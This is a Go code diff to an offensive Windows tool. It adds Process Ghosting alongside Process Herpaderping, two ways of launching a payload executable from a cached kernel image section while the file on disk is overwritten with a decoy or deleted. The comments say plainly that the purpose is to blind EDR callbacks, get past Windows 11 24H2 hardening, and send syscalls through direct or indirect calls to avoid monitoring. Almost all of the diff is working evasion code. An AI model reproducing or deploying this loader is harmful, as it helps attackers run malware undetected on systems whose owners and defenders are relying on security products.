@@ -22,20 +22,49 @@ const (
 	sectionAllAccess            = 0x000F001F
 	processBasicInformation     = 0
 	rtlUserProcParamsNormalized = 0x01
+
+	// fileDispositionInformationExClass is the FILE_INFORMATION_CLASS value
+	// for NtSetInformationFile. Distinct from the FILE_INFO_BY_HANDLE_CLASS
+	// value (21) used by SetFileInformationByHandle.
+	fileDispositionInformationExClass = uintptr(64)
 )
 
-// Config controls herpaderping execution.
+// Mode selects between the two image-section process creation variants.
+type Mode int
+
+const (
+	// ModeHerpaderping (default) writes the payload, creates the section,
+	// then overwrites the disk file with decoy content before NtCreateThreadEx.
+	// EDR callbacks fire against the decoy, not the payload.
+	// Note: NtCreateProcessEx is hardened on Win11 24H2 for this pattern;
+	// use ModeGhosting on that build.
+	ModeHerpaderping Mode = iota
+
+	// ModeGhosting marks the target file delete-pending before NtCreateSection
+	// so the file is gone from disk by the time NtCreateProcessEx runs.
+	// Bypasses the Win11 24H2 image-load notify validation that blocks
+	// ModeHerpaderping, and leaves no file artefact on disk at all.
+	ModeGhosting
+)
+
+// Config controls herpaderping/ghosting execution.
 type Config struct {
+	// Mode selects the technique variant. Default (zero) is ModeHerpaderping.
+	// Use ModeGhosting on Win11 24H2 or when no disk artefact is acceptable.
+	Mode Mode
+
 	// PayloadPath is the path to the PE to execute stealthily.
 	PayloadPath string
 
 	// TargetPath is the path where the PE will be written temporarily.
-	// This file is overwritten with decoy content before thread creation.
+	// Herpaderping: overwritten with DecoyPath content before thread creation.
+	// Ghosting: marked delete-pending and removed from disk before NtCreateProcessEx.
 	// If empty, a temp file is used.
 	TargetPath string
 
-	// DecoyPath is the path to a legitimate PE used to overwrite the target.
-	// If empty, the target is overwritten with random bytes.
+	// DecoyPath is the path to a legitimate PE used to overwrite the target
+	// (ModeHerpaderping only). If empty, random bytes are used. Ignored in
+	// ModeGhosting.
 	DecoyPath string
 
 	// Caller routes NT syscalls through direct/indirect methods to bypass
@@ -63,6 +92,12 @@ func ntCall(caller *wsyscall.Caller, name string, proc *windows.LazyProc, args .
 	return 0, nil
 }
 
+// ioStatusBlock mirrors IO_STATUS_BLOCK (x64: Status uint32 + 4 pad + Information uintptr).
+type ioStatusBlock struct {
+	Status      uint32
+	_           [4]byte
+	Information uintptr
+}
 
 // processBasicInfo mirrors PROCESS_BASIC_INFORMATION.
 type processBasicInfo struct {
@@ -104,21 +139,54 @@ type rtlUserProcessParameters struct {
 	CommandLine   unicodeString
 }
 
-// Run executes a PE using the Process Herpaderping technique.
+// ghostMarkDeletePending marks hFile for POSIX deletion via NtSetInformationFile.
 //
-// How it works:
-//  1. Writes the payload PE to the target path on disk
-//  2. Creates an image section from the file (NtCreateSection + SEC_IMAGE)
-//     -- this caches the payload in kernel memory
-//  3. Creates a process object from the section (NtCreateProcessEx)
-//  4. Overwrites the target file with decoy content (benign PE or random bytes)
-//     -- security products now see the decoy, not the payload
-//  5. Sets up process parameters (PEB, ImagePathName, CommandLine)
-//  6. Creates the initial thread (NtCreateThreadEx)
-//     -- this triggers EDR callbacks, but the file on disk is now benign
+// With FILE_DISPOSITION_DELETE|FILE_DISPOSITION_POSIX_SEMANTICS the kernel
+// unlinks the name from the directory immediately (not deferred to last-handle-
+// close), while the file object stays alive for all current open handles —
+// including the hFile we pass to NtCreateSection next. Closing hFile after
+// NtCreateSection completes the deletion; the section retains its own reference
+// to the file object so the image pages are not freed until the process exits.
+func ghostMarkDeletePending(hFile windows.Handle, caller *wsyscall.Caller) error {
+	type fileDispositionInfoEx struct {
+		Flags uint32
+	}
+	info := fileDispositionInfoEx{
+		Flags: windows.FILE_DISPOSITION_DELETE | windows.FILE_DISPOSITION_POSIX_SEMANTICS,
+	}
+	var iosb ioStatusBlock
+	r, err := ntCall(caller, "NtSetInformationFile", api.ProcNtSetInformationFile,
+		uintptr(hFile),
+		uintptr(unsafe.Pointer(&iosb)),
+		uintptr(unsafe.Pointer(&info)),
+		uintptr(unsafe.Sizeof(info)),
+		fileDispositionInformationExClass,
+	)
+	if r != 0 {
+		return fmt.Errorf("NtSetInformationFile: %w", err)
+	}
+	return nil
+}
+
+// Run executes a PE using the Process Herpaderping or Process Ghosting technique,
+// selected by cfg.Mode. Both exploit NtCreateSection(SEC_IMAGE) image caching so
+// the running process executes the original payload from kernel memory while the
+// on-disk file shows no trace of it.
 //
-// The running process executes the original payload from kernel cache,
-// while any file inspection shows the decoy content.
+// ModeHerpaderping (default):
+//  1. Write payload to TargetPath
+//  2. NtCreateSection — caches payload image in kernel
+//  3. NtCreateProcessEx — process object from section
+//  4. Overwrite TargetPath with DecoyPath (or random bytes)
+//  5. NtCreateThreadEx — EDR callbacks fire; disk shows the decoy
+//
+// ModeGhosting:
+//  1. Write payload to TargetPath
+//  2. NtSetInformationFile — mark delete-pending (POSIX); name removed from disk
+//  3. NtCreateSection — section from still-open (but nameless) file
+//  4. CloseHandle(hFile) — file data freed from disk; section retains kernel ref
+//  5. NtCreateProcessEx — process from section; no backing file exists
+//  6. NtCreateThreadEx — EDR callbacks see no file artefact at all
 func Run(cfg Config) error {
 	// Read payload (via Opener — stealth or standard)
 	payload, err := stealthopen.OpenRead(cfg.Opener, cfg.PayloadPath)
@@ -137,16 +205,25 @@ func Run(cfg Config) error {
 		tmp.Close()
 	}
 
-	// Step 1: Write payload to target file
 	targetPathW, err := windows.UTF16PtrFromString(targetPath)
 	if err != nil {
 		return fmt.Errorf("utf16 target: %w", err)
 	}
 
+	// Ghosting needs DELETE access to call NtSetInformationFile, and
+	// FILE_SHARE_DELETE so the delete-pending flag coexists with the
+	// section creation on the same handle.
+	accessMask := uint32(windows.GENERIC_READ | windows.GENERIC_WRITE)
+	shareMode := uint32(windows.FILE_SHARE_READ)
+	if cfg.Mode == ModeGhosting {
+		accessMask |= windows.DELETE
+		shareMode |= windows.FILE_SHARE_DELETE
+	}
+
 	hFile, err := windows.CreateFile(
 		targetPathW,
-		windows.GENERIC_READ|windows.GENERIC_WRITE,
-		windows.FILE_SHARE_READ,
+		accessMask,
+		shareMode,
 		nil,
 		windows.CREATE_ALWAYS,
 		windows.FILE_ATTRIBUTE_NORMAL,
@@ -157,9 +234,13 @@ func Run(cfg Config) error {
 	}
 	autoTemp := cfg.TargetPath == ""
 	succeeded := false
+	hFileClosed := false
 	defer func() {
-		windows.CloseHandle(hFile)
-		// Only delete on failure — on success the decoy file should remain on disk.
+		if !hFileClosed {
+			windows.CloseHandle(hFile)
+		}
+		// Only delete on failure — on success, herpaderping leaves the decoy
+		// on disk intentionally; ghosting already removed the file.
 		if !succeeded && autoTemp {
 			os.Remove(targetPath)
 		}
@@ -170,7 +251,14 @@ func Run(cfg Config) error {
 		return fmt.Errorf("write payload: %w", err)
 	}
 
-	// Step 2: Create image section from the file
+	// Ghosting step: unlink name from disk before creating the section.
+	if cfg.Mode == ModeGhosting {
+		if err := ghostMarkDeletePending(hFile, cfg.Caller); err != nil {
+			return fmt.Errorf("mark delete-pending: %w", err)
+		}
+	}
+
+	// Create image section from the file.
 	var hSection windows.Handle
 	r, err := ntCall(cfg.Caller, "NtCreateSection", api.ProcNtCreateSection,
 		uintptr(unsafe.Pointer(&hSection)),
@@ -186,7 +274,15 @@ func Run(cfg Config) error {
 	}
 	defer windows.CloseHandle(hSection)
 
-	// Step 3: Create process from the section
+	// Ghosting step: close file handle — this completes the physical deletion.
+	// The section retains its own reference to the file object so the image
+	// pages remain valid until the section is released.
+	if cfg.Mode == ModeGhosting {
+		windows.CloseHandle(hFile)
+		hFileClosed = true
+	}
+
+	// Create process from the section.
 	var hProcess windows.Handle
 	r, err = ntCall(cfg.Caller, "NtCreateProcessEx", api.ProcNtCreateProcessEx,
 		uintptr(unsafe.Pointer(&hProcess)),
@@ -204,35 +300,36 @@ func Run(cfg Config) error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	// Step 4: Overwrite the file on disk with decoy content
-	windows.SetFilePointer(hFile, 0, nil, 0)
+	// Herpaderping step: overwrite the file on disk with decoy content.
+	if cfg.Mode == ModeHerpaderping {
+		windows.SetFilePointer(hFile, 0, nil, 0)
 
-	var decoyData []byte
-	if cfg.DecoyPath != "" {
-		decoyData, err = stealthopen.OpenRead(cfg.Opener, cfg.DecoyPath)
-		if err != nil {
-			return fmt.Errorf("read decoy: %w", err)
+		var decoyData []byte
+		if cfg.DecoyPath != "" {
+			decoyData, err = stealthopen.OpenRead(cfg.Opener, cfg.DecoyPath)
+			if err != nil {
+				return fmt.Errorf("read decoy: %w", err)
+			}
+		} else {
+			decoyData = make([]byte, len(payload))
+			if _, err := io.ReadFull(rand.Reader, decoyData); err != nil {
+				return fmt.Errorf("generate random decoy: %w", err)
+			}
 		}
-	} else {
-		// Fill with random bytes matching payload size
-		decoyData = make([]byte, len(payload))
-		if _, err := io.ReadFull(rand.Reader, decoyData); err != nil {
-			return fmt.Errorf("generate random decoy: %w", err)
+
+		if err := windows.WriteFile(hFile, decoyData, &written, nil); err != nil {
+			return fmt.Errorf("write decoy: %w", err)
 		}
+		// Flush to ensure disk is updated before thread creation.
+		windows.FlushFileBuffers(hFile)
 	}
 
-	if err := windows.WriteFile(hFile, decoyData, &written, nil); err != nil {
-		return fmt.Errorf("write decoy: %w", err)
-	}
-	// Flush to ensure disk is updated before thread creation
-	windows.FlushFileBuffers(hFile)
-
-	// Step 5: Set up process parameters
+	// Set up process parameters.
 	if err := setupProcessParameters(hProcess, targetPath, cfg.Caller); err != nil {
 		return fmt.Errorf("setup params: %w", err)
 	}
 
-	// Step 6: Get the entry point and create the initial thread
+	// Get the entry point and create the initial thread.
 	entryPoint, err := getEntryPoint(hProcess, payload, cfg.Caller)
 	if err != nil {
 		return fmt.Errorf("get entry point: %w", err)
@@ -392,8 +489,8 @@ func getEntryPoint(hProcess windows.Handle, payload []byte, caller *wsyscall.Cal
 	if int(eLfanew)+4+20+16+4 > len(payload) {
 		return 0, fmt.Errorf("invalid PE header offset")
 	}
-	// PE signature at e_lfanew, then COFF header (20 bytes), then optional header
-	// AddressOfEntryPoint is at offset 16 in the optional header
+	// PE signature at e_lfanew, then COFF header (20 bytes), then optional header.
+	// AddressOfEntryPoint is at offset 16 in the optional header.
 	optionalHeaderOffset := int(eLfanew) + 4 + 20 // PE sig(4) + COFF(20)
 	addressOfEntryPoint := *(*uint32)(unsafe.Pointer(&payload[optionalHeaderOffset+16]))
 
